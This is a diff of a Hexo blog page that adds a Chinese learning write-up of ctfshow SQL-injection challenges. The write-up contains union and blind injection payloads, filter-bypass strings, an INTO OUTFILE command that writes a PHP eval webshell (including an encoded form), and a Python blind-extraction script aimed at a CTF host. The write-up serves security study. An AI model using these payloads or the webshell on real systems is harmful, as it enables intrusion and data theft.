@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.8.0">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://example.com/archives/2025/01/"/>
+  
+  <link rel="canonical" href="http://example.com/2025/03/04/ctfshowsql注入/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,15 +33,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Archive: 2025/1 - Hexo</title>
+  <title>ctfshowSQL注入 - Hexo</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="Hexo - John Doe - Hexo">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2025/01/index.html">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshowSQL注入">
+<meta property="og:url" content="http://example.com/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ctfshow_SQL注入笔记前言最近要再去学一下MySQL，就顺便把ctfshow上面的题目做了，再去学一下sqlmap的用法。 主要是因为以前SQL注入全是在靶场上进行的，学的基本上就是一些简单的绕过方法，和实际做题感觉有很大区别 172关1.用户名过滤12345$sql &#x3D; &quot;select username,password from ctfshow_user2 where use">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2025-03-04T11:58:06.000Z">
+<meta property="article:modified_time" content="2025-03-09T10:21:37.212Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2168,7 +2172,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin end-->
     <!-- front-matter body_begin begin -->
     <!-- front-matter body_begin end -->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2437,7 +2441,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="half" class='cover-wrapper  dock' style="display: ;">
+      <div id="none" class='cover-wrapper post dock' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://gcore.jsdelivr.net/gh/MHG-LAB/cron@gh-pages/bing/bing.jpg"></div>
 
@@ -2512,30 +2516,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-	
-		
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/21/留言板/">
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/04/ctfshowSQL注入/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Hexo">
   </span>
@@ -2544,293 +2526,323 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/01/21/%E7%95%99%E8%A8%80%E6%9D%BF/"  itemprop="url">
-        留言板
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
+    
+    
+      <h1 class="title" itemprop="name headline">
+        ctfshowSQL注入
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-03-04T19:58:06+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Mar 4, 2025</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
     
   </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <h1 id="ctfshow-SQL注入笔记"><a href="#ctfshow-SQL注入笔记" class="headerlink" title="ctfshow_SQL注入笔记"></a>ctfshow_SQL注入笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要再去学一下MySQL，就顺便把ctfshow上面的题目做了，再去学一下sqlmap的用法。</p>
+<p>主要是因为以前SQL注入全是在靶场上进行的，学的基本上就是一些简单的绕过方法，和实际做题感觉有很大区别</p>
+<h2 id="172关"><a href="#172关" class="headerlink" title="172关"></a>172关</h2><h3 id="1-用户名过滤"><a href="#1-用户名过滤" class="headerlink" title="1.用户名过滤"></a>1.用户名过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>-&gt;username!==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个sql语句和闭合都是非常简单的，不同的是我们无法直接拿到flag，只有在查询结果的用户名不为flag才能查询成功</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;  order by 2 --+ </span></span><br><span class="line"><span class="string">//首先判断其为2字段</span></span><br></pre></td></tr></table></figure>
+
+<p>但表格为3字段，也就是说实际上有3字段只不过，只能用两个字段进行排序</p>
+<p>若表中实际有 3 列但存在隐藏字段或视图限制，可能导致误判，也就是说可能是id被隐藏和限制了</p>
+<p>但是，我们这次可以看到sql语句的源码，我们发现在前面有<strong>select username,password</strong>这句话，也就意味着查询结果指定了只有两个字段</p>
+<img src="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/image-20250304203100324.png" class="lazyload" data-srcset="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/image-20250304203100324.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250304203100324">
+
+<p>这种情况，我们只需要不用username进行联合查询即可，id可以换成任意</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;  union select 1,password from ctfshow_user3 --+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="174关"><a href="#174关" class="headerlink" title="174关"></a>174关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user4 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题对于回显数据，过滤掉了flag和含数字的结果</p>
+<h3 id="1-数字过滤"><a href="#1-数字过滤" class="headerlink" title="1.数字过滤"></a>1.数字过滤</h3><p>我看网上很多人写了sql注入的脚本，莫非脚本才是主流解法吗，可是我python都没怎么写过</p>
+<p><strong>方法1</strong><br>这道题目首先可以使用盲注，我只介绍一下思路，毕竟太麻烦了，等我学会写盲注脚本就一切都结束了</p>
+<p>首先我们可以通过题目回显来判断语句的对错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1 --+ #正常回显</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+ #错误回显</span></span><br></pre></td></tr></table></figure>
+
+<p>于是我们可以通过盲注的步骤依次推断出flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = f&quot;1 or ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;# &quot; #查库</span><br><span class="line">#payload = f&quot;1&#x27; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;note&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;#&quot; #查表</span><br><span class="line">#payload = f&quot;1&#x27; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;fl4g&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;#&quot; #查列</span><br><span class="line">#payload = f&quot;1&#x27; or ascii(substr((seleCt(flag)from(fl4g)),&#123;i&#125;,1))&gt;&#123;mid&#125;#&quot; #查数据</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法2</strong></p>
+<p>这次是过滤了数字，我们可以利用sql中的replace()函数将数字进行替换即可</p>
+<p><strong>replace()</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(string_expression, search_string, replacement_string)</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明</strong>：</p>
+<ul>
+<li><code>string_expression</code>：原字符串（支持字符或二进制数据）。</li>
+<li><code>search_string</code>：需要被替换的子串。</li>
+<li><code>replacement_string</code>：替换后的新内容。若为空，则删除所有<code>search_string</code></li>
+</ul>
+<p>实例</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> REPLACE(REPLACE(<span class="string">&#x27;30AB&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;01&#x27;</span>), <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;02&#x27;</span>);  <span class="comment">-- 结果：&#x27;300102&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以和上面一样，把所有数字替换为对应的字符即可</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">select &#x27;</span>a<span class="string">&#x27;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>$A<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>$B<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>$C<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>$D<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>$E<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>$F<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>$G<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>$H<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>$I<span class="string">&#x27;),&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>$J<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">from ctfshow_user4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">where username = &#x27;</span>flag<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">%23</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>然后把拿到的结果进行替换回来即可</p>
+<img src="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/image-20250308161809477.png" class="lazyload" data-srcset="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/image-20250308161809477.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250308161809477">
+
+<h2 id="175关"><a href="#175关" class="headerlink" title="175关"></a>175关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user5 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题匹配到了ascii的127位，也就是数字和字母全都被过滤掉了，相应的也可以用盲注，但还是太麻烦了</p>
+<h3 id="1-into-outfile-导出数据"><a href="#1-into-outfile-导出数据" class="headerlink" title="1.into outfile()导出数据"></a>1.into outfile()导出数据</h3><p>这个就是通过导出查询数据到网站根目录下，写入一句话木马然后通过蚁剑进行一个数据库操作拿到flag</p>
+<p>我们先写马</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,&quot;&lt;?php eval($_POST[1])?&gt;&quot; INTO OUTFILE &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span><span class="number">1.</span>php<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">本来这样应该可以执行成功的但不知道什么问题，估计是一句话木马出现了什么特殊字符，直接编码算了</span></span><br><span class="line"><span class="string">先进行base64编码再url编码</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span>           <span class="number">1</span>,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%68%63%4a%46%39%51%54%31%4e%55%57%7a%46%64%4b%54%38%2b&quot;) <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/3.php&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>我服了这个老六，妈的写进去了还是接口错误，我都不知道我是哪句话写进去的，只能重新做一遍</p>
+<p>事实证明，第一句话就是对的，执行了但是不知道为什么还是接口错误，总之都是可以执行的</p>
+<p>我们可以通过查看连接文件拿到用户名和密码</p>
+<img src="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/image-20250308193351744.png" class="lazyload" data-srcset="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/image-20250308193351744.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250308193351744">
+
+<p>最后拿到flag</p>
+<img src="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/image-20250308193609925.png" class="lazyload" data-srcset="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/image-20250308193609925.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250308193609925">
+
+
+
+<p>我们可以把查询结果写入文件，当然也可以直接查flag然后写入文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select username, password from ctfshow_user5 into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>flag.txt<span class="string">&#x27; %23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="177关"><a href="#177关" class="headerlink" title="177关"></a>177关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这次题目绕过了空格，之前sqli-lab出现过这种情况，但没有仔细注意，这里就总结一些绕过空格的方法</p>
+<h3 id="1-空格过滤"><a href="#1-空格过滤" class="headerlink" title="1.空格过滤"></a>1.空格过滤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0a回车   %09 tab  %0c 换页 /**/ 注释 /n换行符 /t制表符</span><br></pre></td></tr></table></figure>
+
+<p>有些地方也可以省略空格，比如</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union/**/select&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span><span class="number">3</span><span class="string">&#x27;%23</span></span><br><span class="line"><span class="string">#select 后面使用引号隔绝</span></span><br></pre></td></tr></table></figure>
+
+<p>还需要注意的是在sql语句中+会被看作空格，所以注释不能用–+</p>
+<p><strong>反引号</strong></p>
+<p>有一些场景也可以用反引号代替，我们先看一下sql语句里面的反引号</p>
+<p><strong>转义标识符</strong><br>当数据库表名、字段名等标识符与 <strong>SQL 保留关键字冲突</strong>（如 <code>order</code>、<code>select</code>）或包含 <strong>特殊字符</strong>（如空格、连字符）时，用反引号包裹可避免语法错误。</p>
+<p>也就是说，分隔表名和字段名的时候可以使用反引号</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#虽然直接用万能密码也能过，但大多数时候只会返回一行，所以还是直接找到flag比较好</span><br><span class="line"><span class="string">&#x27;union/**/select&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">2</span><span class="string">&#x27;,group_concat(password)/**/from%0actfshow_user/**/where/**/username=&#x27;</span>flag<span class="string">&#x27;%23</span></span><br><span class="line"><span class="string">用了各种方法，都可以替换</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="181关"><a href="#181关" class="headerlink" title="181关"></a>181关</h2><p>前面几关都好水，全都是空格过滤，虽然这关也差不多，不过我发现有个奇怪的地方</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>按理来说是把我之前的空格全部过滤掉了，但是不知道为什么%0c还是可以用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or%0cusername=&#x27;</span>flag</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/image-20250308220928726.png" class="lazyload" data-srcset="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/image-20250308220928726.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250308220928726">
+
+<p>虽然这样也可以，但是这就是个bug，作者出来挨打</p>
+<p>网上也有无bug的写法，就是用括号</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;or(username=&#x27;</span>flag<span class="string">&#x27;)and&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="183关-开始写脚本了"><a href="#183关-开始写脚本了" class="headerlink" title="183关 开始写脚本了"></a>183关 开始写脚本了</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(pass) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这个把该过滤的全部过滤掉了，还过滤掉了所有空格，我们只能通过盲注来推断出flag的具体内容，直接复制别人的脚本是没有意义的，我直接上手，我们根据是否返回值判断字符</p>
+<img src="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/image-20250309150121877.png" class="lazyload" data-srcset="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/image-20250309150121877.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250309150121877">
+
+<p>我们首先使用POST请求查找flag，发现成功返回一行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tableName<span class="operator">=</span>(ctfshow_user)<span class="keyword">where</span>(pass)<span class="keyword">like</span><span class="string">&#x27;%25c%25&#x27;</span></span><br><span class="line">#需要注意的是，<span class="keyword">like</span>后面的内容需要用引号引起来，而且在url编码中<span class="operator">%</span>属于特殊字符我们<span class="string">&#x27;%c%&#x27;</span>必须进行编码为<span class="string">&#x27;%25c%25&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功找到注入语句后就可以开始写脚本了</p>
+<p>这是我人生中写的第一个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://03b69989-d73e-4cb6-8dcc-51fad125e7e2.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&#x27;&#123;abcdefghijklmnopqrstuvwxyz-1234567890&#125;&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>:<span class="string">&quot;(ctfshow_user)where(pass)regexp(\&#x27;ctfshow&#123;&#125;\&#x27;)&quot;</span>.<span class="built_in">format</span>(flag+j)</span><br><span class="line">        &#125;</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>具体原理就是查找flag再进行正则匹配，使用占位符{}和.format(flag+j)实现查找，然后输出正确的查找结果</p>
+<p>这个脚本不是特别完善，但也是开始了</p>
